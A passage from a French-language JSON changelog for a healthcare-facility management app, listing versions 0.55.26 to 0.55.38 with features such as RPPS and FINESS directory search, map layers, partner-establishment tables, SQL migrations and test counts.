      { "code": "FE", "txt": "Carte /carte : 3 nouveaux panels de filtres en plus du FINESS — RPPS (8 professions avec couleurs et emojis : Médecin 🩺 bleu, Infirmier 💉 vert, Kiné 🤸 ambre, Pharmacien 💊 rouge, Sage-femme 🤰 violet, Dentiste 🦷 teal, Pédicure 🦶 dark teal, Orthophoniste 🗣 violet foncé). SIRENE (5 catégories : pharmacies, matériel médical, orthopédie, audioprothésistes, opticiens)" },
      { "code": "FE", "txt": "Carte : 3 layers Leaflet séparés (finessOverlay, rppsOverlay, sireneOverlay). Marqueurs custom différenciés (cercle pour FINESS, cercle plus petit pour RPPS, carré arrondi pour SIRENE entreprises). Refresh auto au déplacement de la carte (debounce 800ms). Compteur de résultats par layer" },
      { "code": "FE", "txt": "Carte : popups marqueurs enrichies avec emoji + badge profession (RPPS) ou badge SIRENE + nom + spécialité + adresse + tel + ID officiel. Croisement possible : on peut activer FINESS + RPPS + SIRENE en même temps pour voir un quartier complet" },
      { "code": "AI", "txt": "+18 tests Vitest : Wikipedia retiré + /api/place utilisé (2), réponse sans clé (2), RatingStars logique (3), AlertToast system (5), filtres carte (3), schéma SQL (3). Total 1299 tests verts (vs 1281)" }
    ],
    "themes": ["users", "ui_ux", "fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.38.html",
    "sqlFile": "aveho-PATCH-vers-0.55.38.sql"
  },
  {
    "v": "0.55.37",
    "kind": "hotfix",
    "titre": "🩹 Fix version login (0.1 → dynamique pkg) · Retry RPPS name= si family= retourne 403 (ex: 'lacroix') · AddressAutocomplete INSEE BAN intégré sur fiche partenaire + fiche user · Features list login mise à jour (FINESS/SIRENE/RPPS/biométrie)",
    "chantiers": [
      { "code": "FIX", "txt": "Bug 'Version Alpha 0.1' hardcoded dans le popup de connexion : remplacé par <code>{pkg.version.replace(/-alpha$/, '')}</code> dynamique. Tooltip 'Build 0.55.37-alpha' au survol. Synchronisé automatiquement à chaque bump de version" },
      { "code": "FIX", "txt": "Bug RPPS 'API ANS HTTP 403' sur le nom 'lacroix' (et d'autres) : l'API ANS rejette certains noms via le paramètre family=. Désormais : si family= retourne 403 ou 400 et que le nom fait 2+ caractères, retry automatique avec name= (paramètre FHIR plus permissif qui cherche sur l'ensemble des champs name). Message d'erreur amélioré : 'API ANS HTTP 403. Essayez avec un autre nom ou ajoutez un critère (ville, profession).'" },
      { "code": "FE", "txt": "Login mis à jour avec les évolutions récentes : 5 features listées au lieu de 3 — Multi-établissements + partenaires (FINESS, SIRENE, RPPS), Annuaire RPPS national 1,7M praticiens API FHIR ANS, Connexion biométrique (empreinte + reconnaissance faciale), Plan de l'établissement, HDS+RGPD. Icônes adaptées (ti-building-community, ti-stethoscope, ti-fingerprint, ti-bed, ti-shield-check)" },
      { "code": "FE", "txt": "AddressAutocomplete (BAN INSEE api-adresse.data.gouv.fr, gratuit sans clé) intégré dans la modale création/édition de /etablissements-partenaires : remplace l'input adresse simple par un champ avec suggestions live. onSelect remplit automatiquement adresse + cp + ville + latitude + longitude. Badge vert '(autocomplétée INSEE)' à côté du label" },
      { "code": "FE", "txt": "AddressAutocomplete aussi intégré dans /utilisateurs (fiche détaillée d'un user, onglet info personnelle) : le champ 'Adresse postale' devient autocomplété. Badge vert (autocomplétée INSEE) visible" },
      { "code": "AI", "txt": "+16 tests Vitest : version dynamique (2), features list (3), RPPS retry conditions (6), message d'erreur (2), AddressAutocomplete onSelect (2), hint UI (1). Total 1281 tests verts (vs 1265)" }
    ],
    "themes": ["fixes", "users", "ui_ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.37.html",
    "sqlFile": null
  },
  {
    "v": "0.55.36",
    "kind": "version",
    "titre": "📸 Photos établissements via Wikipedia API (gratuit, sans clé) · Bannières dans /vue-globale, /etablissement/fiche, /etablissements-partenaires · Cache localStorage 7 jours · Fallback gradient par type",
    "chantiers": [
      { "code": "FE", "txt": "Nouveau composant EtabPhoto.js réutilisable : tente de récupérer une photo de l'établissement via l'API Wikipedia FR (gratuite, sans clé, CORS OK avec origin=*). Requête en un seul appel via generator=search + prop=pageimages + pithumbsize=600. Si succès → affiche l'image en cover. Sinon → fallback gradient + icône colorée par type" },
      { "code": "FE", "txt": "Mapping type → icône+gradient : Hôpital (bleu hospital), EHPAD (violet community), Clinique (vert stethoscope), Cabinet (ambre prescription), Pharmacie (rouge pill), Fournisseur (teal truck), Sous-traitant (ambre handshake), Autre (gris building). Détection par prefix dans le type (4 premiers chars lowercase)" },
      { "code": "FE", "txt": "Cache intelligent à 2 niveaux : (1) Mémoire RAM via Map() pour éviter les requêtes parallèles concurrentes pendant la session, (2) localStorage avec TTL 7 jours. Cache aussi les ÉCHECS (URL vide) pour ne pas re-tenter inutilement la même recherche. Clé cache = nom|ville" },
      { "code": "FE", "txt": "Skeleton loader animé (gradient 90deg animé) pendant la requête Wikipedia. Affichage de la photo en background-image avec gradient overlay foncé en bas pour lisibilité du texte. Watermark discret 'Wikipedia' en bas à droite pour attribution" },
      { "code": "FE", "txt": "Intégration dans /vue-globale : remplace le simple gradient dans .mag-photo par EtabPhoto avec hauteur 140px. Le badge 'PARTENAIRE' violet est conservé en overlay top-right avec z-index 2" },
      { "code": "FE", "txt": "Intégration dans /etablissement/fiche : bannière full-width 180px en haut de page avec dégradé navy bas → transparent haut + nom de l'établissement + type + ville + badge FINESS en overlay. Effet hero comme sur Booking/Airbnb" },
      { "code": "FE", "txt": "Intégration dans /etablissements-partenaires : bannière 100px en tête de chaque tuile + avatar coloré 44x44 (selon type_relation) qui chevauche la photo (margin-top négatif, border 2px blanc, shadow). Hover lift effet (translateY -2px + shadow)" },
      { "code": "FE", "txt": "Modale édition partenaire : bannière photo 140px en haut avec overlay sombre gradient bas + nom + ville. Look pro et identifiable d'un coup d'œil. Affichage uniquement en mode édition (pas en création vu qu'on n'a pas encore les infos)" },
      { "code": "AI", "txt": "+19 tests Vitest : construction URL Wikipedia (5), parsing réponse (3), cache localStorage TTL 7j (4), fallback par type (5), query construction (2). Total 1265 tests verts (vs 1246)" }
    ],
    "themes": ["ui_ux", "users"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.36.html",
    "sqlFile": null
  },
  {
    "v": "0.55.35",
    "kind": "hotfix",
    "titre": "🩹 Fix API RPPS HTTP 403/502 (ville sans nom) · Auto-rattachement RPPS→FINESS · Validation 2 lettres min · Rebuild qui devrait corriger 'kind is not defined' (résidu ancien bundle)",
    "chantiers": [
      { "code": "FIX", "txt": "Bug 502 'FHIR API HTTP 403' quand le user cherchait par ville seule (sans nom) : l'API ANS rejette family= (espace vide). Désormais : si q < 2 caractères ET ville/cp fournis → bascule sur endpoint PractitionerRole avec location.address-city / location.address-postalcode et _include=PractitionerRole:practitioner pour récupérer les praticiens" },
      { "code": "FIX", "txt": "Si l'API ANS retourne quand même une erreur (rate limit, maintenance, etc.), réponse HTTP 200 avec ok:false et message lisible au lieu de 502 brutal → le composant frontend affiche un message clair sans crasher" },
      { "code": "FIX", "txt": "RppsSearch côté client : ne plus envoyer 'q= ' (espace forcé) qui plantait l'API. Validation 2 caractères minimum dans le code. Côté serveur, retour 400 explicite 'Précise au moins un nom (2 lettres min.) ou un n° RPPS' si critères insuffisants" },
      { "code": "FE", "txt": "Auto-rattachement RPPS → FINESS dans /annuaire-rpps : la fonction normalizePractitioner extrait désormais le N° FINESS depuis Organization.reference (format Organization/750712184) + organization_name depuis display. Le bouton 'Rattacher à un étab' cherche automatiquement l'établissement dans la base avec ce FINESS et le pré-sélectionne avec badge vert 'Auto-rattachement détecté !'" },
      { "code": "FE", "txt": "Si le FINESS du praticien n'est PAS dans la base, banner ambre 'FINESS détecté <code> mais aucun étab dans ta base. Choisis manuellement.' Cherche d'abord dans etablissements (Mes), puis dans etablissements_partenaires si pas trouvé" },
      { "code": "•", "txt": "Le rebuild de cette version remet le SW à 0.55.35 et devrait écraser tout résidu d'ancien bundle Vercel (qui pouvait contenir l'erreur 'kind is not defined' héritée d'une build cassée). Si l'erreur persiste après déploiement, vide complètement le cache du navigateur (Ctrl+Shift+Suppr)" },
      { "code": "AI", "txt": "+23 tests Vitest : construction URL FHIR (6), useRoleSearch logique (5), fallback gracieux (3), extraction FINESS regex (4), auto-link match (3), normalizePractitioner enrichi (2). Total 1246 tests verts (vs 1223)" }
    ],
    "themes": ["fixes", "users"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.35.html",
    "sqlFile": null
  },
  {
    "v": "0.55.34",
    "kind": "version",
    "titre": "📞 Actions Appeler/Mail/GPS (popup choix Maps/Apple/Waze/OSM) dans toutes les listes RPPS/partenaires · Création partenaire par FINESS/SIRENE · Badge version → bouton i avec popup · Rappel SQL idempotent (fix 404 partenaires_rpps)",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.55.34 : RAPPEL idempotent de toutes les tables précédentes (partenaires_rpps, etablissements_partenaires, colonnes etablissements). Permet de rattraper si les patchs 0.55.30/0.55.31/0.55.33 n'ont pas tous été joués. CREATE TABLE IF NOT EXISTS + ADD COLUMN IF NOT EXISTS + policies DO $$ EXISTS$$ → 100% safe à rejouer" },
      { "code": "FE", "txt": "Nouveau composant ContactActions.js (réutilisable partout) : 3 boutons compacts Appeler (tel:) bleu, Mail (mailto:) vert, GPS (popup choix) ambre. S'affichent uniquement si la donnée correspondante existe (telephone/email/adresse ou coords). N'apparaît pas du tout si aucune donnée" },
      { "code": "FE", "txt": "Popup GPS au clic sur le bouton GPS : 4 options (Google Maps, Apple Plans, Waze, OpenStreetMap) avec icônes + couleurs de marque + lien externe. 5ème option 'Copier l'adresse' via clipboard.writeText. Utilise les coords si disponibles, sinon l'adresse encodée. URLs : maps.google.com/dir/?api=1&destination= · maps.apple.com/?daddr= · waze.com/ul?ll=...&navigate=yes · openstreetmap.org/?mlat=&mlon=#map=18/" },
      { "code": "FE", "txt": "Intégration ContactActions dans : tuiles RppsSearch (toutes les pages qui l'utilisent : /annuaire-rpps, modales /utilisateurs et /partenaires-rpps), cartes /partenaires-rpps, cartes /etablissements-partenaires (utilise lat/lng en plus pour précision GPS). Tous les onClick sur le bouton ont un stopPropagation pour ne pas déclencher le onClick de la carte parente" },
      { "code": "FE", "txt": "Création d'un partenaire dans /etablissements-partenaires : nouveau bloc violet 'Remplir automatiquement' en haut de la modale CRÉATION (pas en édition) avec 2 champs side-by-side — FinessSearch (santé) et SireneSearch (entreprises). Sélection d'un résultat → pré-remplit nom/type/finess/siret/siren/adresse/cp/ville/telephone du form. Composants déjà existants réutilisés sans duplication" },
      { "code": "FE", "txt": "TopBar : badge 'v0.55.x' visible remplacé par un bouton 'i' compact (cercle 26x26 avec icône ti-info-circle). Au clic, ouvre un Modal centré 'À propos d'Aveho EC' avec logo gradient, badge version mono, et 2 actions (Voir le changelog / Fermer). Idem mode mobile : juste un i discret, popup centré au clic" },
      { "code": "AI", "txt": "+18 tests Vitest : ContactActions affichage conditionnel (4), URLs GPS générées (5), tel/mailto encoding (3), recherche FINESS/SIRENE pré-remplissage (3), popup version (2), test global +1. Total 1224 tests verts (vs 1206)" }
    ],
    "themes": ["users", "ui_ux", "fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.34.html",
    "sqlFile": "aveho-PATCH-vers-0.55.34.sql"
  },
  {
    "v": "0.55.33",
    "kind": "version",
    "titre": "🔍 RPPS production unifié : filtres ville/mode/CP, liste 100 résultats, actions Rattacher + Inviter dans les tuiles · Colonnes manquantes etablissements · Verrouillage SQL est_partenaire/groupement_id après création",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.55.33 : ajout idempotent de 16 colonnes manquantes sur etablissements (adresse, cp, pays, latitude, longitude, finess, siret, siren, contact_nom, contact_fonction, telephone, email, site_web, notes, tags[], est_partenaire avec default false). Indexes partiels sur finess/siret/cp pour recherche rapide" },
      { "code": "SQL", "txt": "Triggers de verrouillage : trg_lock_etab_critical_fields sur etablissements (est_partenaire + groupement_id) et trg_lock_etab_part_critical sur etablissements_partenaires (type_relation + groupement_id) → blocage si tentative de modification sans droit parametres_admin. Erreur claire raise exception" },
      { "code": "SQL", "txt": "Nouvelle colonne invitations.origine (default 'manuelle', valeurs : manuelle/rpps_annuaire/rpps_partenaire) pour tracer la source des invitations. 2 nouvelles RPCs : link_partenaire_rpps_to_etablissement (ajoute un partenaire RPPS à etablissement_ids[] sans doublon via @>) et unlink_partenaire_rpps_from_etablissement (array_remove)" },
      { "code": "FE", "txt": "Composant RppsSearch refondu — UNIQUE, utilisé partout sans duplication. 6 filtres : nom OR RPPS exact, profession (12 valeurs), mode d'exercice (3 valeurs : libéral/salarié/remplaçant), ville (texte libre), CP (préfixe département accepté), limite (20/50/100). Bouton 'Effacer' qui reset tout. Indicateur 'Augmente la limite' quand on atteint le max" },
      { "code": "FE", "txt": "Nouvelles tuiles RPPS plus riches : avatar gradient bleu/teal, badge profession en haut, ligne spécialité avec icône prescription, ligne mode d'exercice avec icône briefcase, adresse complète, tel/email cliquables, RPPS+ADELI en footer mono. Hauteur ~120px par tuile, jusqu'à 100 affichables" },
      { "code": "FE", "txt": "Composant RppsSearch supporte 2 modes : (1) onSelect={(p) => ...} → clic tuile = sélection (utilisé dans /partenaires-rpps et /utilisateurs création) ; (2) renderActions={(p) => <JSX/>} → affiche des boutons custom sous chaque tuile (utilisé dans /annuaire-rpps). Pas de code dupliqué" },
      { "code": "FE", "txt": "Page /annuaire-rpps refondue : 2 boutons par tuile — vert 'Rattacher à un étab' (modale avec liste de Mes étabs + Partenaires) et bleu 'Transformer en utilisateur' (modale avec choix de l'email, du rôle, et CHECKBOXES pour sélectionner les infos à pré-remplir : prénom/nom/téléphone/RPPS/ADELI/profession/spécialité/mode/adresse)" },
      { "code": "FE", "txt": "Action 'Rattacher' crée d'abord le partenaire_rpps dans la table s'il n'existe pas (avec classification auto médecin→prescripteur), puis appelle la RPC link_partenaire_rpps_to_etablissement. Détection doublon par RPPS. Confirmation par dialog" },
      { "code": "FE", "txt": "Action 'Transformer en utilisateur' : modale 'Voulez-vous envoyer une invitation ?', email pré-rempli depuis RPPS si disponible, sélecteur de rôle obligatoire, liste de checkboxes par champ avec valeur affichée à côté. À la confirmation : insert invitation avec origine='rpps_annuaire' + appel Edge Function invite-user pour mail" },
      { "code": "API", "txt": "/api/rpps : supporte les nouveaux query params ville et mode. Filtres appliqués côté serveur (FHIR ne les filtre pas natif). Limite portée à 100 (était 50). Filtre client tolérant : contient/inclut (pas strict equals)" },
      { "code": "AI", "txt": "+18 tests Vitest : filtres étendus (5), filtre client API (4), action Transformer en utilisateur (4), action Rattacher (2), verrouillage SQL (3), schéma colonnes (3). Total 1203 tests verts (vs 1185)" }
    ],
    "themes": ["users", "fixes", "rls_securite"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.33.html",
    "sqlFile": "aveho-PATCH-vers-0.55.33.sql"
  },
  {
    "v": "0.55.32",
    "kind": "hotfix",
    "titre": "🔧 Hotfix migration SQL 0.55.31 : passage à to_jsonb() pour tolérer un schéma `etablissements` variable (colonnes cp/latitude/longitude/groupement_id peuvent ne pas exister)",
    "chantiers": [
      { "code": "FIX", "txt": "Bug 0.55.31 : la migration plantait avec ERROR 42703 'record \"e\" has no field \"cp\"' sur les structures dont la table etablissements n'a pas toutes les colonnes attendues. La boucle `for e in select * from etablissements` avec `e.cp` plante si cp n'existe pas" },
      { "code": "SQL", "txt": "Solution : passage à `for e in select to_jsonb(t) from etablissements t` puis accès via `e->>'cp'`. Si la clé n'existe pas, `->>` renvoie NULL au lieu de planter. Idem pour latitude/longitude/groupement_id avec `nullif(...,'')::numeric` pour gérer les conversions" },
      { "code": "SQL", "txt": "Bloc EXCEPTION ajouté autour de chaque INSERT pour ne pas bloquer la migration sur une ligne corrompue (raise NOTICE, continue avec les autres)" },
      { "code": "SQL", "txt": "Vue v_etablissements_all construite DYNAMIQUEMENT via execute format() : détecte la présence de cp/groupement_id sur etablissements et utilise 'null::text/uuid' si absente. Évite l'erreur au CREATE VIEW" },
      { "code": "SQL", "txt": "RPC convert_etab_to_partner refondue avec accès jsonb pour le même problème. Plus de %rowtype qui plante" },
      { "code": "•", "txt": "Le patch est IDEMPOTENT et peut être rejoué : si la table partenaires est déjà créée, on saute la création. Si la migration a déjà tourné, on ne re-migre pas (vérif via NOT EXISTS sur link_to_etablissement_id)" },
      { "code": "•", "txt": "1185 tests Vitest verts (idem 0.55.31, pas de nouveau code JS, juste fix SQL)" }
    ],
    "themes": ["fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.32.html",
    "sqlFile": "aveho-PATCH-vers-0.55.32.sql"
  },
  {
    "v": "0.55.31",
    "kind": "version",
    "titre": "🏗 Table DÉDIÉE etablissements_partenaires (séparée d'etablissements) + table d'audit dédiée etab_partenaires_audit avec triggers + page de gestion complète + vue unifiée + RPC de conversion",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.55.31 : nouvelle table etablissements_partenaires (29 colonnes) — identité (nom, type, type_relation), identifiants officiels (finess, siret, siren), adresse (+ lat/lng), contact référent (contact_nom, contact_fonction, telephone, email, site_web), métadonnées (notes, tags[], groupement_id), link_to_etablissement_id pour transition douce, actif/archive, audit complet (created_at/by, updated_at/by)" },
      { "code": "SQL", "txt": "Table d'audit DÉDIÉE etab_partenaires_audit : id, ts, action (INSERT/UPDATE/DELETE), partenaire_id, structure_id, user_id, old_data jsonb, new_data jsonb, changes jsonb (diff colonne-par-colonne calculé automatiquement par le trigger). Index sur ts/structure/partenaire. RLS admin_read (parametres_admin ou utilisateurs_write)" },
      { "code": "SQL", "txt": "Trigger trg_audit_etab_partenaires AFTER INSERT/UPDATE/DELETE qui log automatiquement chaque action avec snapshot complet et diff. Sur UPDATE : ne loggue que si au moins 1 champ a changé. Pas de log pour les changements de updated_at/updated_by seuls" },
      { "code": "SQL", "txt": "Migration AUTOMATIQUE des données : tous les etablissements existants avec est_partenaire=true sont COPIÉS vers etablissements_partenaires (link_to_etablissement_id pointe vers l'ancien). Idempotent : ne re-copie pas si déjà migré. Affiche le compte de migrations dans NOTICE PostgreSQL" },
      { "code": "SQL", "txt": "Vue v_etablissements_all UNION ALL des 2 tables (mes établissements + partenaires non archivés) avec champ source ('mine'/'partner') pour les requêtes qui veulent les 2 en un seul SELECT. security_invoker=true" },
      { "code": "SQL", "txt": "RPC convert_etab_to_partner(p_etab_id) : bascule un établissement legacy vers la nouvelle table avec vérif droits parametres_admin. Renvoie le nouveau partenaire_id. Marque l'ancien est_partenaire=true pour cohérence" },
      { "code": "FE", "txt": "Nouvelle page /etablissements-partenaires : gestion CRUD complète avec 4 KPIs (Partenaires actifs, Prescripteurs, Fournisseurs, Sous-traitants), recherche multi-champs (nom, type, ville, FINESS, SIRET), filtre par type de relation (5 types : Prescripteur/Fournisseur/Sous-traitant/Confrère/Autre)" },
      { "code": "FE", "txt": "Modale création/édition partenaire (24 champs) avec sections Identité, Identifiants officiels (FINESS/SIRET/SIREN), Adresse, Contact référent (nom + fonction + tel + email + site). Validation 'Nom requis'. Bouton Archiver en mode édition" },
      { "code": "FE", "txt": "Bouton 'Audit' en haut de page → modale historique avec 50 dernières actions, badges colorés par type (INSERT vert, UPDATE ambre, DELETE rouge), <details> dépliable pour voir le diff champ-par-champ (rouge barré → vert) sur UPDATE" },
      { "code": "FE", "txt": "Vue-globale (/vue-globale) refondée pour charger les 2 tables séparément : 'mineRows' depuis etablissements (filtre !est_partenaire), 'partnersFromNewTable' depuis etablissements_partenaires, 'legacyPartners' depuis etablissements (est_partenaire=true ET pas déjà dans la nouvelle table). Évite les doublons via link_to_etablissement_id" },
      { "code": "FE", "txt": "Lien 'Étabs partenaires' ajouté dans le menu TopBar section Établissement (icône ti-building-community violette) entre 'Annuaire étabs' et 'Annuaire RPPS'" },
      { "code": "AI", "txt": "+13 tests Vitest : schéma table (5), types relation (3), vue-globale dual-source (3), trigger diff logic (4), format audit row (3), convert RPC (2). Total 1178 tests verts (vs 1165)" }
    ],
    "themes": ["users", "fixes", "rls_securite"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.31.html",
    "sqlFile": "aveho-PATCH-vers-0.55.31.sql"
  },
  {
    "v": "0.55.30",
    "kind": "version",
    "titre": "🤝 Partenaires RPPS (table dédiée non-utilisateurs) · Mail/popup invitation enrichi RPPS · Hotfix vue-globale (groupement_id) · RPC ajout user au bâtiment",
    "chantiers": [
      { "code": "FIX", "txt": "Hotfix 400 sur /vue-globale : le SELECT contenait 'groupement_id' qui n'existait pas sur la table etablissements. Colonne ajoutée dans le patch SQL 0.55.30 (avec index partiel) + table groupements créée si absente avec RLS" },
      { "code": "SQL", "txt": "Patch 0.55.30 : nouvelle table partenaires_rpps (id, structure_id, rpps, adeli, civilite, nom, prenom, profession, specialite, mode_exercice, adresse, cp, commune, telephone, telephone_mobile, email, notes, tags[], est_prescripteur, est_intervenant, etablissement_ids[], created_at, created_by, updated_at, archive)" },
      { "code": "SQL", "txt": "Contrainte unicité par (structure_id, rpps) avec archive=false → un même praticien ne peut être ajouté qu'une fois. Index sur nom + profession + structure pour recherche rapide. RLS member_rw. Trigger updated_at automatique" },
      { "code": "SQL", "txt": "Vue v_partenaires_rpps avec colonnes virtuelles (nb_etablissements_lies) + security_invoker. RPCs add_user_to_etablissement(p_user_id, p_etablissement_id) et remove_user_from_etablissement (security definer, vérif droits utilisateurs_write OU parametres_admin)" },
      { "code": "FE", "txt": "Nouvelle page /partenaires-rpps : liste des partenaires non-utilisateurs (médecins prescripteurs, IDE libéraux, kinés). 3 filtres : Tous / Prescripteurs / Intervenants. Recherche par nom/prénom/profession/RPPS/commune. Cartes avec avatar violet, badges colorés (PRESCRIPTEUR bleu, INTERVENANT vert, RPPS violet)" },
      { "code": "FE", "txt": "Bouton 'Ajouter un partenaire depuis RPPS' qui ouvre RppsSearch. Au clic sur un résultat : insertion automatique avec classification (médecin → est_prescripteur, infirm/kin/sage → est_intervenant). Détection de doublon par RPPS avec message d'alerte" },
      { "code": "FE", "txt": "Modale détails partenaire avec coordonnées cliquables (tel: + mailto:) + bouton 'Archiver' (rouge). Lien dans le menu TopBar section Établissement (entre Annuaire RPPS et Carte)" },
      { "code": "FE", "txt": "Mail d'invitation Resend enrichi : bloc violet 'Identité professionnelle (RPPS)' avec profession + spécialité + n° RPPS. Banner ambre '🔒 Rattachement verrouillé' si lock_assignment=true. Subject du mail personnalisé (ex: 'Invitation Aveho EC — Médecin'). Edge Function invite-user mise à jour" },
      { "code": "FE", "txt": "Pop-up post-création d'invitation enrichi : récap complet de ce qui a été envoyé (nom, rôle, matricule, établissements rattachés en pills, badge VERROUILLÉ si lock, bloc violet RPPS si renseigné, lien copiable). État createdInviteLink passe de string à object" },
      { "code": "AI", "txt": "+18 tests Vitest : classification auto (6), filtres recherche partenaires (4), structure objet popup (2), add_user RPC idempotence (1), hotfix groupement_id (1). Total 1169 tests verts (vs 1151)" }
    ],
    "themes": ["users", "fixes", "rls_securite"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.30.html",
    "sqlFile": "aveho-PATCH-vers-0.55.30.sql"
  },
  {
    "v": "0.55.29",
    "kind": "version",
    "titre": "🩺 RPPS production (API FHIR ANS officielle) · Bouton 'Rechercher RPPS' à la création utilisateur · Champs RPPS dans fiche user · Filtre vue-globale Mes/Partenaires/Tous",
    "chantiers": [
      { "code": "FIX", "txt": "Vue globale multi-établissements : filtre est_partenaire dans la requête SQL et toggle UI 'Mes établissements / Partenaires / Tous' avec compteurs. Les partenaires affichent un badge violet 'PARTENAIRE' et un CTA différent ('Voir la fiche partenaire' qui mène à /etablissements?focus=...)" },
      { "code": "API", "txt": "/api/rpps refondu : utilise l'API FHIR Annuaire Santé ANS officielle (gateway.api.esante.gouv.fr/fhir/v2/Practitioner). Plus de mock par défaut, données réelles ~1.7M praticiens en accès libre, sans clé. Cache serveur 1h" },
      { "code": "API", "txt": "Normalisation FHIR Practitioner + PractitionerRole → format unifié (rpps, adeli, civilite, nom, prenom, profession, specialite, mode_exercice, adresse, cp, commune, telephone, email). Fetch parallèle des rôles pour chaque résultat (limité à 10 pour la perf)" },
      { "code": "SQL", "txt": "Patch 0.55.29 : invitations + membres_structure étendus avec rpps, adeli, rpps_profession, rpps_specialite, rpps_mode_exercice. Index partiel idx_invitations_rpps et idx_membres_rpps. Vue v_user_complete régénérée avec les nouveaux champs + security_invoker. RPC get_invitation_full retourne les RPPS" },
      { "code": "FE", "txt": "Modale 'Créer un utilisateur' : nouveau bouton violet 'Rechercher RPPS' à côté du titre 'Identité' qui ouvre une modale RppsSearch. Au clic sur un praticien, pré-remplit automatiquement prénom/nom/téléphone/fonction + champs RPPS dédiés (rpps/adeli/profession/spécialité/mode)" },
      { "code": "FE", "txt": "Badge violet 'Pré-rempli depuis RPPS' affiché en haut de la section Identité quand un RPPS est associé, avec affichage profession+spécialité+RPPS et bouton 'Retirer' pour défaire le pré-remplissage" },
      { "code": "FE", "txt": "Fiche utilisateur (modale info) : nouveau bloc violet 'Données RPPS (annuaire ANS)' affiché si l'user a un RPPS, avec affichage formaté du n° RPPS, n° ADELI, profession, spécialité et mode d'exercice" },
      { "code": "FE", "txt": "RppsSearch : bandeau d'info adapté — vert 'Source : API FHIR ANS officielle (~1.7M praticiens, libre accès)' en production, jaune 'Mode démonstration' uniquement si l'API tombe en fallback" },
      { "code": "AI", "txt": "+14 tests Vitest : normalisation FHIR Practitioner (system rpps/idnatps/adeli, prefix civilité, code profession, specialty spécialité), filtre vue-globale, construction URL FHIR, schéma RPPS invitations. Total 1151 tests verts (vs 1137)" }
    ],
    "themes": ["users", "fixes", "rls_securite"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.29.html",
    "sqlFile": "aveho-PATCH-vers-0.55.29.sql"
  },
  {
    "v": "0.55.28",
    "kind": "version",
    "titre": "🩺 Annuaire RPPS (cabinets libéraux) · Bilan ménage code (console.* déjà à 0, SafeWrite audit ciblé)",
    "chantiers": [
      { "code": "FE", "txt": "Nouvelle page /annuaire-rpps : recherche de professionnels de santé libéraux (médecins, infirmiers, kinés, sages-femmes, pharmaciens, etc.) par nom, n° RPPS, profession et code postal. Complémentaire au FINESS qui ne couvre que les établissements" },
      { "code": "API", "txt": "Nouvel endpoint /api/rpps : proxy serveur vers data.gouv.fr (Tabular API du dataset Annuaire ANS). Cache 1h serveur. Mock fallback automatique si RPPS_DATASET_RID non configuré (mode démo avec 4 praticiens fictifs)" },
      { "code": "FE", "txt": "Nouveau composant RppsSearch (app/components/RppsSearch.js) réutilisable : champs nom + RPPS + profession + CP, validation regex sur RPPS (11 chiffres exactement), bandeau jaune si mode démo, liste résultats avec carte cliquable hover" },
      { "code": "FE", "txt": "Modale détails au clic sur un résultat : affichage des champs profession, spécialité, mode d'exercice, RPPS/ADELI (mono), adresse complète, téléphone cliquable, email mailto. Utilise le composant <Modal> partagé (0.55.26)" },
      { "code": "UX", "txt": "Lien 'Annuaire RPPS (libéraux)' ajouté dans le menu TopBar section Établissement (entre 'Établissements' et 'Carte'), icône stéthoscope violette" },
      { "code": "FE", "txt": "Page dédiée avec header icône teal, bloc d'aide sombre avec lien vers https://annuaire.sante.fr/ (annuaire officiel ANS) pour les recherches avancées" },
      { "code": "AI", "txt": "+15 tests Vitest : normalizeEntry (format ANS officiel + alternatif), validation RPPS/ADELI regex, filtres mock par nom/rpps/profession/cp, PROFESSIONS list. Total 1137 tests verts (vs 1122)" },
      { "code": "•", "txt": "Bilan ménage technique : migration console.* officiellement TERMINÉE (les 27 du compteur étaient des .error autorisés + texte changelog). SafeWrite : audit montre que les 26 writes directs restants sont majoritairement légitimes (config admin, batch CRUD, ConflictResolver), pas de cleanup massif nécessaire" }
    ],
    "themes": ["users", "ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.28.html"
  },
  {
    "v": "0.55.27",
    "kind": "version",
    "titre": "Cheatsheet raccourcis clavier (touche ?) + navigation G+lettre · Migration logger sécurisé sur 7 fichiers supplémentaires",
    "chantiers": [
      { "code": "FE", "txt": "Nouveau composant KeyboardHelp monté dans le layout : appuyez sur '?' n'importe où dans l'app (hors champs texte) pour ouvrir une cheatsheet avec tous les raccourcis disponibles. Utilise le composant Modal partagé (0.55.26)" },
      { "code": "FE", "txt": "Navigation par raccourcis : 'G puis A' = /accueil, 'G puis P' = /patients, 'G puis M' = /materiel, 'G puis U' = /utilisateurs, 'G puis L' = /changelog, 'G puis S' = /profil. La séquence a une fenêtre de 1.5s entre les 2 touches" },
      { "code": "UX", "txt": "Cheatsheet organisée en 4 sections : Navigation, Recherche, Modales et listes, Débogage. Touches affichées sous forme de <kbd> stylisées avec ombre" },
      { "code": "FIX", "txt": "Migration console.* → logger.* sur 7 fichiers supplémentaires : app/inscription/[token]/page.js, app/utilisateurs/page.js, app/signalements/page.js, app/achats/page.js, app/transferts/page.js, lib/events.js, lib/useOffline.js" },
      { "code": "FIX", "txt": "Compteur console.* en prod : 51 occurrences en 0.55.25 → 27 en 0.55.27 (-47%, migration progressive)" },
      { "code": "AI", "txt": "+16 tests Vitest sur isTypingInInput (détection focus champs), NAV_MAP (routes G+lettre), structure SHORTCUTS et paths logger. Total 1122 tests verts (vs 1106)" }
    ],
    "themes": ["ux", "fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.27.html"
  },
  {
    "v": "0.55.26",
    "kind": "version",
